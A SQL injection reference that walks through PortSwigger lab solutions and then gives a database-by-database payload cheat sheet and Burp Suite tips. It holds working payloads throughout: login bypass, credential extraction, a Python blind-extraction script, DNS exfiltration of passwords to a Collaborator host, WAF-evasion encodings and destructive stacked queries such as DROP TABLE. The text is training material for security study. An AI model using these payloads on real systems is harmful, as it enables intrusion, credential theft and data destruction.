# SQL Injection Attack Reference

## Overview

SQL injection (SQLi) is a web security vulnerability that allows attackers to interfere with database queries executed by applications. It remains one of the most critical web application vulnerabilities, enabling attackers to:

- View unauthorized data (passwords, credit cards, personal information)
- Modify or delete database contents
- Execute administrative operations on the database
- Compromise underlying server infrastructure
- Establish persistent backdoors

## Attack Categories

### 1. In-Band SQL Injection

**Error-Based SQL Injection**
- Exploits verbose database error messages
- Forces database to generate errors containing sensitive data
- Quick identification of database type and structure

**Union-Based SQL Injection**
- Leverages the UNION SQL operator
- Combines results from injected queries with legitimate queries
- Retrieves data from multiple database tables

### 2. Inferential SQL Injection (Blind)

**Boolean-Based Blind SQL Injection**
- Application behavior changes based on TRUE/FALSE conditions
- No direct query output displayed
- Infers data by observing response differences

**Time-Based Blind SQL Injection**
- Uses database time delay functions
- Infers information from response timing
- Works when application shows identical responses

### 3. Out-of-Band SQL Injection

**OAST (Out-of-Application Security Testing)**
- Triggers external network connections
- Exfiltrates data through DNS, HTTP, or other protocols
- Useful when in-band channels are unavailable

---

## PortSwigger Lab Solutions

### Lab 1: SQL Injection in WHERE Clause - Retrieve Hidden Data

**Difficulty:** Apprentice
**URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

**Vulnerability:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Exploitation:**
```
Parameter: category
Payload: '+OR+1=1--
```

**Result:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

**Key Concepts:**
- Boolean logic manipulation
- SQL comment syntax to truncate query
- OR operator always evaluates to TRUE

**Burp Suite Tools:**
- Burp Proxy (interception)
- Burp Repeater (testing)

---

### Lab 2: SQL Injection - Login Bypass

**Difficulty:** Apprentice
**URL:** https://portswigger.net/web-security/sql-injection/lab-login-bypass

**Objective:** Authenticate as administrator without password

**Exploitation:**
```
Username: administrator'--
Password: [anything]
```

**How It Works:**
Original query structure:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='[input]'
```

The `--` comments out password check, bypassing authentication.

**Common Variations:**
```sql
admin'--
admin'#
' OR '1'='1
' OR 1=1--
admin' OR '1'='1
```

**Burp Suite Tools:**
- Burp Proxy (login interception)
- Burp Repeater (payload testing)

---

### Lab 3: UNION Attack - Determining Column Count

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

**Objective:** Determine number of columns returned by query

**Method 1 - NULL Injection:**
```
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
```

Continue until error disappears.

**Method 2 - ORDER BY:**
```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--
```

Continue until error appears (column count exceeded).

**Why NULL?**
- Compatible with all data types
- Prevents type mismatch errors
- Universal approach across databases

**Burp Suite Tools:**
- Burp Repeater (iterative testing)

---

### Lab 4: UNION Attack - Finding Text Column

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

**Objective:** Identify which columns accept string data

**Step 1 - Determine Column Count:**
```
'+UNION+SELECT+NULL,NULL,NULL--
```

**Step 2 - Test Each Column:**
```
'+UNION+SELECT+'abcdef',NULL,NULL--
'+UNION+SELECT+NULL,'abcdef',NULL--
'+UNION+SELECT+NULL,NULL,'abcdef'--
```

**Lab-Specific Payload:**
Replace 'abcdef' with lab-provided random string.

**Key Technique:**
Systematic column enumeration to identify string-compatible columns for data exfiltration.

---

### Lab 5: UNION Attack - Retrieving Data from Other Tables

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

**Target:** `users` table with `username` and `password` columns

**Step 1 - Verify Structure:**
```
'+UNION+SELECT+'abc','def'--
```

**Step 2 - Extract Credentials:**
```
'+UNION+SELECT+username,password+FROM+users--
```

**Step 3:** Login with administrator credentials

**Core Concept:**
UNION attacks allow retrieving data from any accessible database table, not just the original query target.

---

### Lab 6: UNION Attack - Multiple Values in Single Column

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

**Challenge:** Only one column accepts string data

**Step 1 - Identify Structure:**
```
'+UNION+SELECT+NULL,'abc'--
```

**Step 2 - Concatenate Multiple Values:**
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

**Database-Specific Concatenation:**
- **Oracle:** `||` or `CONCAT()`
- **Microsoft SQL Server:** `+`
- **PostgreSQL:** `||`
- **MySQL:** ` ` (space) or `CONCAT()`

**Payload Variations:**
```sql
-- Oracle/PostgreSQL
'+UNION+SELECT+NULL,username||':'||password+FROM+users--

-- Microsoft SQL Server
'+UNION+SELECT+NULL,username+':'+password+FROM+users--

-- MySQL
'+UNION+SELECT+NULL,CONCAT(username,':',password)+FROM+users--
```

---

### Lab 7: Database Version Query - MySQL/Microsoft

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

**Objective:** Display database version string

**Step 1 - Verify Structure:**
```
'+UNION+SELECT+'abc','def'#
```

**Step 2 - Extract Version:**
```
'+UNION+SELECT+@@version,NULL#
```

**MySQL-Specific:**
```
'+UNION+SELECT+version(),NULL#
```

**Comment Syntax:**
- MySQL: `#` or `-- ` (note space after --)
- Microsoft: `--`

**Version Information Uses:**
- Identify database type
- Find known vulnerabilities (CVE lookup)
- Determine available functions and features

---

### Lab 8: Database Version Query - Oracle

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

**Oracle Requirement:** Every SELECT must include FROM clause

**Step 1 - Verify Structure:**
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

**Step 2 - Extract Version:**
```
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

**Oracle-Specific Tables:**
- `dual` - Dummy table for SELECT statements
- `v$version` - Database version information
- `v$instance` - Instance details

**Alternative Version Queries:**
```sql
'+UNION+SELECT+version,NULL+FROM+v$instance--
```

---

### Lab 9: Listing Database Contents - Non-Oracle

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

**Objective:** Enumerate tables and columns to extract admin credentials

**Step 1 - Verify Structure:**
```
'+UNION+SELECT+'abc','def'--
```

**Step 2 - List All Tables:**
```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

**Step 3 - Identify User Table:**
Look for tables like `users_abcdef` in results.

**Step 4 - List Columns:**
```
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

**Step 5 - Extract Credentials:**
```
'+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef--
```

**Information Schema:**
- `information_schema.tables` - All database tables
- `information_schema.columns` - All table columns
- Standard in PostgreSQL, MySQL, Microsoft SQL Server

---

### Lab 10: Listing Database Contents - Oracle

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

**Oracle-Specific Considerations:**
- Requires `FROM dual` for testing
- Table/column names stored in UPPERCASE
- Different system tables than information_schema

**Step 1 - Verify Structure:**
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

**Step 2 - List Tables:**
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Step 3 - List Columns (UPPERCASE table name):**
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

**Step 4 - Extract Credentials:**
```
'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

**Oracle System Tables:**
- `all_tables` - All accessible tables
- `user_tables` - Tables owned by current user
- `all_tab_columns` - All accessible columns

---

### Lab 11: Blind SQL Injection - Conditional Responses

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

**Attack Vector:** `TrackingId` cookie
**Indicator:** "Welcome back" message appears conditionally

**Step 1 - Verify Boolean Logic:**
```
TrackingId=xyz' AND '1'='1
```
Result: "Welcome back" appears

```
TrackingId=xyz' AND '1'='2
```
Result: No "Welcome back" message

**Step 2 - Confirm Target Table:**
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Step 3 - Verify Administrator Account:**
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Step 4 - Determine Password Length:**
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
```

**Step 5 - Extract Characters (Burp Intruder):**
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

**Burp Intruder Configuration:**
- Attack type: Sniper
- Payload: a-z, 0-9
- Grep Match: "Welcome back"
- Iterate SUBSTRING position from 1-20

**Common Mistakes:**
- Not configuring Grep Match correctly
- Wrong SUBSTRING syntax for database
- Testing with non-existent usernames

---

### Lab 12: Blind SQL Injection - Conditional Errors

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

**Database:** Oracle
**Indicator:** HTTP 500 error when condition is TRUE

**Step 1 - Trigger Error:**
```
TrackingId=xyz'
```

**Step 2 - Valid Syntax:**
```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

**Step 3 - Conditional Error Logic:**
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Result: HTTP 500 (division by zero)

**Step 4 - Determine Password Length:**
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Step 5 - Extract Characters:**
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Burp Intruder Setup:**
- Payload: a-z, 0-9
- Monitor HTTP status codes
- HTTP 500 = match found
- HTTP 200 = no match

**Key Technique:**
CASE statement with division by zero creates conditional error responses.

---

### Lab 13: Visible Error-Based SQL Injection

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

**Attack Vector:** `TrackingId` cookie
**Technique:** Force type casting errors to leak data

**Step 1 - Test Injection:**
```
TrackingId=xyz'
```
Reveals query structure in error message.

**Step 2 - Comment Out Remainder:**
```
TrackingId=xyz'--
```

**Step 3 - Build Valid Query:**
```
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--
```

**Step 4 - Extract Username:**
```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Error reveals: `ERROR: invalid input syntax for type integer: "administrator"`

**Step 5 - Extract Password:**
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Error reveals the password.

**Key Points:**
- Verbose error messages leak sensitive data
- CAST/CONVERT type mismatches display actual values
- Character limits may require removing original tracking ID
- Use LIMIT 1 to prevent multi-row errors

---

### Lab 14: Blind SQL Injection - Time Delays

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

**Database:** PostgreSQL
**Objective:** Cause 10-second delay

**Payload:**
```
TrackingId=x'||pg_sleep(10)--
```

**Database-Specific Time Delays:**

**PostgreSQL:**
```sql
'; SELECT pg_sleep(10)--
'||(SELECT pg_sleep(10))--
```

**MySQL:**
```sql
'; SELECT SLEEP(10)#
'||(SELECT SLEEP(10))#
```

**Microsoft SQL Server:**
```sql
'; WAITFOR DELAY '0:0:10'--
```

**Oracle:**
```sql
'||(SELECT dbms_pipe.receive_message('a',10) FROM dual)||'
```

**Burp Suite:**
- Use Burp Repeater
- Observe response timing
- Look for ~10 second delay

---

### Lab 15: Blind SQL Injection - Time Delays with Information Retrieval

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

**Database:** PostgreSQL
**Target:** 20-character administrator password (alphanumeric lowercase)

**Step 1 - Test Boolean Logic:**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
Result: 10-second delay

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
Result: No delay

**Step 2 - Verify Administrator:**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Step 3 - Determine Length:**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Step 4 - Extract Characters (Burp Intruder):**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**CRITICAL Burp Intruder Configuration:**

1. **Resource Pool Settings:**
   - Create new resource pool
   - Set "Maximum concurrent requests" to `1`
   - Single-threaded execution ensures accurate timing

2. **Attack Configuration:**
   - Attack type: Sniper
   - Payload: a-z, 0-9
   - Monitor "Response received" column
   - Correct character: ~10,000ms
   - Incorrect character: ~100-500ms

3. **Iterate Positions:**
   - Increment SUBSTRING offset from 1-20
   - Build password character by character

**Common Mistakes:**
- Not setting single-threaded resource pool (causes unreliable timing)
- Using insufficient delay time
- Not URL-encoding properly
- Watching wrong timing column

**Python Alternative:**
```python
import requests
import time
import string

url = "https://lab-url.web-security-academy.net/"
password = ""

for position in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        payload = f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        cookies = {"TrackingId": payload}

        start = time.time()
        requests.get(url, cookies=cookies)
        elapsed = time.time() - start

        if elapsed > 9:  # 10 second delay
            password += char
            print(f"Position {position}: {char}")
            break

print(f"Password: {password}")
```

---

### Lab 16: Blind SQL Injection - Out-of-Band Interaction

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

**Requirements:** Burp Suite Professional (Burp Collaborator)
**Database:** Oracle
**Objective:** Trigger DNS lookup to Burp Collaborator

**Payload:**
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
```

**Steps:**
1. Intercept request with `TrackingId` cookie
2. Right-click in Burp Repeater → Insert Collaborator payload
3. Replace `BURP-COLLABORATOR-SUBDOMAIN` with generated subdomain
4. Send request
5. Check Burp Collaborator tab for DNS/HTTP interaction

**How It Works:**
- Combines SQL injection with XXE (XML External Entity)
- EXTRACTVALUE() processes XML with external entity
- External entity references Collaborator domain
- Database performs DNS lookup
- Collaborator logs interaction

**Database-Specific Out-of-Band Techniques:**

**Oracle:**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR/"> %remote;]>'),'/l') FROM dual
```

**Microsoft SQL Server:**
```sql
exec master..xp_dirtree '//COLLABORATOR/a'
```

**PostgreSQL:**
```sql
copy (SELECT '') to program 'nslookup COLLABORATOR'
```

**MySQL (Windows only):**
```sql
LOAD_FILE('\\\\COLLABORATOR\\a')
SELECT ... INTO OUTFILE '\\\\COLLABORATOR\\a'
```

**Use Cases:**
- Asynchronous query execution
- No visible responses
- Time delays not reliable
- Confirm SQL injection exists

---

### Lab 17: Blind SQL Injection - Out-of-Band Data Exfiltration

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

**Requirements:** Burp Suite Professional
**Database:** Oracle
**Objective:** Exfiltrate administrator password via DNS

**Payload:**
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
```

**Steps:**
1. Insert Burp Collaborator payload
2. Send request
3. Monitor Collaborator for DNS queries
4. Password appears as subdomain: `[PASSWORD].COLLABORATOR.net`

**How Data Exfiltration Works:**
```
1. SQL Query: SELECT password FROM users WHERE username='administrator'
2. String Concatenation: 'http://' || [password] || '.COLLABORATOR/'
3. XXE External Entity: Forces DNS lookup
4. DNS Query: [password].COLLABORATOR.net
5. Collaborator Logs: Captures password from subdomain
```

**Alternative Database Payloads:**

**Microsoft SQL Server:**
```sql
'; exec master..xp_dirtree '//'+( SELECT password FROM users WHERE username='administrator')+'.COLLABORATOR/a'--
```

**PostgreSQL:**
```sql
'; copy (SELECT password FROM users WHERE username='administrator') to program 'nslookup $(whoami).COLLABORATOR'--
```

**Key Advantages:**
- Bypasses WAF/IDS that don't monitor DNS
- Works with asynchronous queries
- Single request data extraction
- No timing analysis required

---

### Lab 18: SQL Injection - Filter Bypass via XML Encoding

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

**Challenge:** WAF blocks SQL injection keywords
**Target:** Stock check feature with XML request body

**Original Request:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Step 1 - Test Input Evaluation:**
```xml
<storeId>1+1</storeId>
```
If response changes, parameter is evaluated.

**Step 2 - Install Hackvertor Extension:**
- Burp Suite → Extender → BApp Store
- Search "Hackvertor" → Install

**Step 3 - Determine Column Count:**
```xml
<storeId>1 UNION SELECT NULL</storeId>
```
Continue until error disappears (single column).

**Step 4 - Encode Payload with Hackvertor:**

Highlight payload:
```
1 UNION SELECT username || '~' || password FROM users
```

Right-click → Extensions → Hackvertor → Encode → hex_entities

**Final Payload:**
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

**How WAF Bypass Works:**

**Original (Blocked):**
```
1 UNION SELECT username FROM users
```

**Hex Entity Encoded (Bypassed):**
```
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;...
```

**Processing Order:**
1. WAF inspects raw request → sees encoded entities → no SQL keywords detected → allows request
2. XML parser decodes entities → reconstructs SQL injection
3. Database executes injected query

**Alternative Encoding Methods:**

**Decimal Entities:**
```xml
<storeId><@dec_entities>1 UNION SELECT username FROM users</@dec_entities></storeId>
```

**Manual Hex Encoding:**
```
U = &#x55;
N = &#x4e;
I = &#x49;
O = &#x4f;
N = &#x4e;
```

**URL Encoding (for URL parameters):**
```
UNION = %55%4e%49%4f%4e
```

**Key Takeaway:**
Encoding transforms attack signature while preserving execution semantics, bypassing signature-based WAF detection.

---

## Exploitation Techniques

### Determining Database Type

**Oracle Detection:**
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT 'abc' FROM dual--
```

**MySQL Detection:**
```sql
' UNION SELECT NULL#
' AND SLEEP(5)#
SELECT @@version#
```

**Microsoft SQL Server Detection:**
```sql
' UNION SELECT NULL--
' WAITFOR DELAY '0:0:5'--
SELECT @@version--
```

**PostgreSQL Detection:**
```sql
' UNION SELECT NULL--
' AND pg_sleep(5)--
SELECT version()--
```

### Column Count Enumeration

**Method 1 - ORDER BY:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Continue until error appears.

**Method 2 - UNION SELECT NULL:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Continue until error disappears.

### Data Type Discovery

**String Columns:**
```sql
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```

**Numeric Columns:**
```sql
' UNION SELECT 1,NULL,NULL--
' UNION SELECT NULL,1,NULL--
```

### Database Enumeration

**List Current Database:**
```sql
-- MySQL
SELECT database()

-- Microsoft SQL Server
SELECT DB_NAME()

-- Oracle
SELECT ora_database_name FROM dual

-- PostgreSQL
SELECT current_database()
```

**List All Databases:**
```sql
-- MySQL
SELECT schema_name FROM information_schema.schemata

-- Microsoft SQL Server
SELECT name FROM master..sysdatabases

-- PostgreSQL
SELECT datname FROM pg_database
```

**List Tables in Current Database:**
```sql
-- MySQL/PostgreSQL/Microsoft
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Oracle
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables
```

**List Columns for Specific Table:**
```sql
-- MySQL/PostgreSQL/Microsoft
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Advanced Extraction Techniques

**Substring Extraction:**
```sql
-- Most databases
SUBSTRING(string, start, length)
SUBSTR(string, start, length)

-- MySQL
MID(string, start, length)
```

**Length Determination:**
```sql
LENGTH(string)  -- MySQL, PostgreSQL
LEN(string)     -- Microsoft SQL Server
```

**Conditional Logic:**
```sql
-- CASE statement (all databases)
CASE WHEN (condition) THEN result1 ELSE result2 END

-- IF function (MySQL)
IF(condition, result1, result2)

-- IIF function (Microsoft SQL Server 2012+)
IIF(condition, result1, result2)
```

### Bypassing Input Validation

**Comment Syntax Variations:**
```sql
--          (SQL standard, requires space after in MySQL)
#           (MySQL)
/*...*/     (Multi-line comment)
```

**Whitespace Alternatives:**
```sql
+           (Plus sign)
%20         (URL-encoded space)
%09         (Tab)
%0a         (Line feed)
%0d         (Carriage return)
/**/        (Empty comment)
```

**Quote Escaping:**
```sql
''          (Two single quotes)
\'          (Backslash escape, MySQL)
%27         (URL-encoded single quote)
CHAR(39)    (Character code for single quote)
```

**Keyword Obfuscation:**
```sql
-- Case variation
SeLeCt, UnIoN

-- Comments within keywords
SEL/**/ECT, UN/**/ION

-- URL encoding
%53%45%4C%45%43%54 (SELECT)

-- Double encoding
%2553%2545%254C%2545%2543%2554

-- Alternative syntax
UniON ALL SeLeCT
```

### Stacked Queries

**Microsoft SQL Server / PostgreSQL:**
```sql
'; INSERT INTO users VALUES ('hacker','password123')--
'; DROP TABLE users--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

**MySQL (requires specific configurations):**
```sql
1'; INSERT INTO users VALUES ('hacker','password123');#
```

**Oracle (requires PL/SQL block):**
```sql
'; BEGIN INSERT INTO users VALUES ('hacker','password123'); END;--
```

### Second-Order SQL Injection

**Concept:** Malicious input stored in database, later executed in different context.

**Phase 1 - Registration:**
```
Username: admin'--
Password: anything
```

**Phase 2 - Retrieval:**
```sql
-- Later query that uses stored username
SELECT * FROM profiles WHERE username='admin'--'
```

The stored username breaks the subsequent query.

**Prevention Requires:**
- Input validation on storage
- Output encoding on retrieval
- Parameterized queries everywhere

---

## Database-Specific Syntax Reference

### String Concatenation

| Database | Operator | Example |
|----------|----------|---------|
| Oracle | `\|\|` | `'foo'\|\|'bar'` |
| Microsoft SQL Server | `+` | `'foo'+'bar'` |
| PostgreSQL | `\|\|` | `'foo'\|\|'bar'` |
| MySQL | ` ` or `CONCAT()` | `'foo' 'bar'` or `CONCAT('foo','bar')` |

### Comment Syntax

| Database | Single Line | Multi-Line |
|----------|-------------|------------|
| Oracle | `--` | `/*...*/` |
| Microsoft SQL Server | `--` | `/*...*/` |
| PostgreSQL | `--` | `/*...*/` |
| MySQL | `#` or `-- ` | `/*...*/` |

### Substring Functions

| Database | Function | Example |
|----------|----------|---------|
| Oracle | `SUBSTR(str,pos,len)` | `SUBSTR('admin',1,1)='a'` |
| Microsoft SQL Server | `SUBSTRING(str,pos,len)` | `SUBSTRING('admin',1,1)='a'` |
| PostgreSQL | `SUBSTRING(str,pos,len)` | `SUBSTRING('admin',1,1)='a'` |
| MySQL | `SUBSTRING(str,pos,len)` | `SUBSTRING('admin',1,1)='a'` |

### Time Delay Functions

| Database | Function | Example |
|----------|----------|---------|
| Oracle | `dbms_pipe.receive_message()` | `dbms_pipe.receive_message('a',10)` |
| Microsoft SQL Server | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `pg_sleep()` | `pg_sleep(10)` |
| MySQL | `SLEEP()` | `SLEEP(10)` |

### Conditional Time Delays

**Oracle:**
```sql
SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual
```

**Microsoft SQL Server:**
```sql
IF (1=1) WAITFOR DELAY '0:0:10'
```

**PostgreSQL:**
```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

**MySQL:**
```sql
SELECT IF(1=1,SLEEP(10),'a')
```

### Version Detection

| Database | Query |
|----------|-------|
| Oracle | `SELECT banner FROM v$version` |
| Oracle | `SELECT version FROM v$instance` |
| Microsoft SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |
| MySQL | `SELECT version()` |

### Current User

| Database | Query |
|----------|-------|
| Oracle | `SELECT user FROM dual` |
| Microsoft SQL Server | `SELECT SYSTEM_USER` |
| Microsoft SQL Server | `SELECT USER_NAME()` |
| PostgreSQL | `SELECT current_user` |
| MySQL | `SELECT user()` |

### List Databases

**Oracle:**
```sql
SELECT DISTINCT owner FROM all_tables
```

**Microsoft SQL Server:**
```sql
SELECT name FROM master..sysdatabases
```

**PostgreSQL:**
```sql
SELECT datname FROM pg_database
```

**MySQL:**
```sql
SELECT schema_name FROM information_schema.schemata
```

### List Tables

**Oracle:**
```sql
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables
```

**Microsoft SQL Server:**
```sql
SELECT table_name FROM information_schema.tables
SELECT name FROM sysobjects WHERE xtype='U'
```

**PostgreSQL:**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

**MySQL:**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

### List Columns

**Oracle:**
```sql
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

**Microsoft SQL Server:**
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**PostgreSQL:**
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**MySQL:**
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## Burp Suite Techniques

### Burp Proxy Configuration

**Setup:**
1. Burp Suite → Proxy → Options
2. Verify proxy listener (default: 127.0.0.1:8080)
3. Configure browser to use proxy
4. Import Burp CA certificate

**Intercept Settings:**
- Enable/disable interception: Burp Proxy → Intercept → Intercept is on/off
- Forward request: Forward button
- Drop request: Drop button
- Send to other tools: Right-click → Send to Repeater/Intruder/etc.

### Burp Repeater Usage

**Workflow:**
1. Capture request in Proxy or HTTP History
2. Right-click → Send to Repeater
3. Modify request parameters
4. Click "Send" to execute
5. Analyze response

**Keyboard Shortcuts:**
- Send request: Ctrl+Space (Windows/Linux) or Cmd+Space (Mac)
- Switch between request/response: Ctrl+Tab
- URL encode: Ctrl+U
- URL decode: Ctrl+Shift+U

**Tips:**
- Create multiple tabs for different payloads
- Use "Copy to clipboard" for sharing requests
- Compare responses side-by-side
- Save interesting requests

### Burp Intruder Configuration

**Attack Types:**

**Sniper:**
- Single payload set
- Tests one position at a time
- Use for: Single parameter testing

**Battering Ram:**
- Single payload set
- Same payload in all positions
- Use for: Testing same value across multiple parameters

**Pitchfork:**
- Multiple payload sets (one per position)
- Iterates through sets in parallel
- Use for: Username/password combinations

**Cluster Bomb:**
- Multiple payload sets
- Tests all combinations
- Use for: Comprehensive testing (can be slow)

**Payload Configuration:**

**Simple List:**
- Predefined list of values
- Upload from file or enter manually

**Character Substitution:**
- Replace characters in base string
- Useful for fuzzing

**Number Range:**
- Generate numeric sequences
- Specify min, max, step

**Grep Match Settings:**
1. Intruder → Options → Grep - Match
2. Click "Add"
3. Enter string to match (e.g., "Welcome back")
4. Matched responses show checkbox in results

**Resource Pool Configuration:**
1. Intruder → Resource Pool tab
2. Create new resource pool
3. Set "Maximum concurrent requests" (1 for time-based attacks)

### Burp Collaborator Usage

**Setup:**
1. Burp Suite Professional → Burp menu → Burp Collaborator client
2. Click "Copy to clipboard" for unique subdomain

**Insert Collaborator Payload:**
1. In Repeater, place cursor where payload goes
2. Right-click → Insert Collaborator payload
3. Unique subdomain inserted automatically

**Monitor Interactions:**
1. Burp menu → Burp Collaborator client
2. Click "Poll now" to check for interactions
3. View DNS and HTTP requests
4. Extract data from subdomains or request parameters

**Use Cases:**
- Out-of-band SQL injection
- XXE (XML External Entity) attacks
- SSRF (Server-Side Request Forgery)
- Blind vulnerabilities confirmation

### Burp Extensions

**Hackvertor:**
- Encoding/decoding payloads
- Bypass WAF filters
- Install: Extender → BApp Store → Hackvertor

**Usage:**
1. Highlight payload
2. Right-click → Extensions → Hackvertor → Encode → [encoding type]
3. Payload wrapped with encoding tags: `<@hex_entities>payload</@hex_entities>`

**Logger++:**
- Enhanced logging
- Advanced filtering
- Install: Extender → BApp Store → Logger++

**SQLiPy:**
- Automated SQL injection detection
- Payload generation
- Install: Extender → BApp Store

---

## Common Payloads Cheat Sheet

